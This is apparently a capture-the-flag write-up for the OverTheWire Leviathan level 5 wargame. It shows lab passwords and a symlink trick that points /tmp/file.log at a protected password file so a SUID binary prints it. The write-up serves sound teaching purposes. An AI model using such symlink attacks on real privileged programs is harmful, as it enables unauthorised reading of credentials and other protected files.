**Username:** ``leviathan5``

**Password:** ``0dyxT7F4QD``


#


We start off the challenge by logging in as ``Leviathan5`` over ssh on Port ``2223``:

```console
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

Looking at the contents of our home directory, this time we are presented with an executable called ``leviathan5`` which has the SUID bit set to run as user leviathan6.  Running the executble simply returns a message saying `Cannot find /tmp/file.log`
```console
leviathan5@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 10 14:23 .
drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ..
-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15144 Apr 10 14:23 leviathan5
-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
```

If you've been following along from the previous levels, the next steps to take should be quite clear by now...  

It looks like the `leviathan5` is attempting to return the contents of `/tmp/file.log`, but it's not finding the file and returniogn an error.  We need to figure out a way of tricking the executable to return the contents of `/etc/leviathan_pass/leviathan6` instead.  How do we do that?  Well, by creating a **symlink** of course!  We can create a symbolic link that points `/tmp/file.log` to `/etc/leviathan_pass/leviathan6`, this way, when the executable looks for `/tmp/file.log` it will follow the symlink and return the contents of `leviathan6` instead.  Keep in mind that with the SUID bit, `leviathan5` is running with the user priviliges of leviathan6, which has read access to `/etc/leviathan_pass/leviathan6`.

```console
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
szo7HDB88w
```

And just like that we can move on to the next level!
